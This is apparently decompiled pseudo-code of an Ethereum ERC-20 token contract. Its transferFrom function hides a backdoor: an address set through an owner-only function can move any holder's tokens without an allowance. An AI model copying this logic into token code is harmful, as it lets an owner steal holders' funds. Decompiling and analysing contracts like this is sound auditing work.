contract main {


// =======================  Init code  ======================


array of uint256 stor0;
array of uint256 stor1;
uint8 stor2;
uint256 stor3;
address stor5;
mapping of uint256 stor6;

function _fallback() payable {
    stor2 = 18
    require not msg.value
    mem[96 len -2832] = code.data[3191 len -2832]
    mem[64] = -2736
    stor3 = mem[96] * 10^stor2
    stor6[address(msg.sender)] = mem[96] * 10^stor2
    stor0[] = Array(len=mem[mem[128] + 96], data=mem[mem[128] + 128 len mem[mem[128] + 96]])
    stor1[] = Array(len=mem[mem[160] + 96], data=mem[mem[160] + 128 len mem[mem[160] + 96]])
    stor5 = msg.sender
    return code.data[359 len 2832]
}



// =====================  Runtime code  =====================


array of uint256 name;
array of uint256 symbol;
uint8 decimals;
uint256 totalSupply;
address stor4;
address stor5;
mapping of uint256 balanceOf;
mapping of uint256 allowance;

function name() {
    return name[0 len name.length]
}

function totalSupply() {
    return totalSupply
}

function decimals() {
    return decimals
}

function balanceOf(address arg1) {
    return balanceOf[arg1]
}

function symbol() {
    return symbol[0 len symbol.length]
}

function allowance(address arg1, address arg2) {
    return allowance[arg1][arg2]
}

function _fallback() payable {
    revert
}

function sub_75999513(?) {
    require stor5 == msg.sender
    stor4 = arg1
}

function approve(address arg1, uint256 arg2) {
    allowance[address(msg.sender)][address(arg1)] = arg2
    return 1
}

function burn(uint256 arg1) {
    require balanceOf[address(msg.sender)] >= arg1
    require arg1 <= balanceOf[address(msg.sender)]
    balanceOf[address(msg.sender)] -= arg1
    require arg1 <= totalSupply
    totalSupply -= arg1
    emit Burn(arg1, msg.sender);
    return 1
}

function approveAndCall(address arg1, uint256 arg2, bytes arg3) {
    allowance[address(msg.sender)][address(arg1)] = arg2
    require ext_code.size(arg1)
    call arg1.receiveApproval(address rg1, uint256 rg2, address rg3, bytes rg4) with:
         gas gas_remaining - 710 wei
        args msg.sender, arg2, address(this.address), Array(len=arg3.length, data=arg3[all])
    require ext_call.success
    return 1
}

function burnFrom(address arg1, uint256 arg2) {
    require balanceOf[address(arg1)] >= arg2
    require arg2 <= allowance[address(arg1)][address(msg.sender)]
    require arg2 <= balanceOf[address(arg1)]
    balanceOf[address(arg1)] -= arg2
    require arg2 <= allowance[address(arg1)][address(msg.sender)]
    allowance[address(arg1)][address(msg.sender)] -= arg2
    require arg2 <= totalSupply
    totalSupply -= arg2
    emit Burn(arg2, arg1);
    return 1
}

function transfer(address arg1, uint256 arg2) {
    require 68 == calldata.size
    require arg1
    require balanceOf[address(msg.sender)] >= arg2
    require arg2 + balanceOf[address(arg1)] >= balanceOf[address(arg1)]
    require arg2 + balanceOf[address(arg1)] > balanceOf[address(arg1)]
    require balanceOf[address(arg1)] + balanceOf[msg.sender] >= balanceOf[msg.sender]
    require arg2 <= balanceOf[address(msg.sender)]
    balanceOf[address(msg.sender)] -= arg2
    require arg2 + balanceOf[arg1] >= balanceOf[arg1]
    balanceOf[address(arg1)] = arg2 + balanceOf[arg1]
    emit Transfer(arg2, msg.sender, arg1);
    require balanceOf[address(arg1)] + balanceOf[msg.sender] >= balanceOf[msg.sender]
    require balanceOf[address(arg1)] + balanceOf[msg.sender] == balanceOf[address(arg1)] + balanceOf[msg.sender]
}

function transferFrom(address arg1, address arg2, uint256 arg3) {
    if stor4 == msg.sender:
        require arg2
        require balanceOf[address(arg1)] >= arg3
        if arg3 + balanceOf[address(arg2)] >= balanceOf[address(arg2)]:
            require arg3 + balanceOf[address(arg2)] > balanceOf[address(arg2)]
            if balanceOf[address(arg2)] + balanceOf[arg1] >= balanceOf[arg1]:
                if arg3 <= balanceOf[address(arg1)]:
                    balanceOf[address(arg1)] -= arg3
                    if arg3 + balanceOf[arg2] >= balanceOf[arg2]:
                        balanceOf[address(arg2)] = arg3 + balanceOf[arg2]
                        emit Transfer(arg3, arg1, arg2);
                        if balanceOf[address(arg2)] + balanceOf[arg1] >= balanceOf[arg1]:
                            if balanceOf[address(arg2)] + balanceOf[arg1] == balanceOf[address(arg2)] + balanceOf[arg1]:
                                return 1
    else:
        require arg3 <= allowance[address(arg1)][address(msg.sender)]
        if arg3 <= allowance[address(arg1)][address(msg.sender)]:
            allowance[address(arg1)][address(msg.sender)] -= arg3
            require arg2
            require balanceOf[address(arg1)] >= arg3
            if arg3 + balanceOf[address(arg2)] >= balanceOf[address(arg2)]:
                require arg3 + balanceOf[address(arg2)] > balanceOf[address(arg2)]
                if balanceOf[address(arg2)] + balanceOf[arg1] >= balanceOf[arg1]:
                    if arg3 <= balanceOf[address(arg1)]:
                        balanceOf[address(arg1)] -= arg3
                        if arg3 + balanceOf[arg2] >= balanceOf[arg2]:
                            balanceOf[address(arg2)] = arg3 + balanceOf[arg2]
                            emit Transfer(arg3, arg1, arg2);
                            if balanceOf[address(arg2)] + balanceOf[arg1] >= balanceOf[arg1]:
                                if balanceOf[address(arg2)] + balanceOf[arg1] == balanceOf[address(arg2)] + balanceOf[arg1]:
                                    return 1
    revert
}



}
